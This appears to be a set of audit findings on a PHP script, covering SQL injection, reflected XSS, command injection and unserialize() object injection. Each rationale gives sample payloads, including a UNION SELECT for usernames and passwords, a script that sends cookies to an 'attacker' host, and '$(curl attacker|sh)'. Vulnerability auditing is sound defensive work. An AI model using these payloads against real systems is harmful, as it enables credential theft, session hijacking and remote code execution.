candidates.title: SQL injection via unsanitized GET parameter concatenated into mysqli_query
candidates.rationale: $_GET['q'] is read at line 2 and concatenated directly into the SQL string passed to mysqli_query at line 3, inside a single-quoted literal. No escaping, casting, or prepared statement is used. A payload such as ?q=' OR '1'='1 or ?q=' UNION SELECT username,password FROM users-- - breaks out of the quote and lets an attacker read or modify arbitrary tables, and stacked/extracted queries permit authentication bypass. Remotely reachable with no authentication or preconditions.

candidates.title: Reflected XSS: raw GET parameter echoed into HTML response
candidates.rationale: $_GET['msg'] is written into the response body with no output encoding or contextual escaping. A crafted link such as ?msg=<script>document.location='//attacker/?c='+document.cookie</script> executes attacker JavaScript in the victim's origin, enabling session theft, CSRF-token bypass, and phishing inside the trusted site. Exploitation requires the victim to follow a crafted URL.

candidates.title: OS command injection via GET parameter passed to shell_exec
candidates.rationale: $_GET['host'] is interpolated into a shell command string handed to shell_exec without escapeshellarg() or validation. Shell metacharacters let the attacker chain arbitrary commands, e.g. ?host=127.0.0.1;id or ?host=$(curl attacker|sh). The command output is echoed back, giving a full non-interactive remote shell as the web server user, which typically leads to complete host compromise.

candidates.title: PHP object injection: unserialize() on attacker-controlled cookie
candidates.rationale: unserialize() is applied directly to $_COOKIE['session'], so the attacker fully controls the serialized payload. This permits PHP object injection: instantiating arbitrary classes present in the codebase or autoloader to trigger magic methods (__wakeup/__destruct/__toString) as gadgets, chaining to file writes, SQL, or code execution; it also enables memory/CPU exhaustion via malformed or deeply nested input. The only prerequisite is setting a cookie on a request to this script.
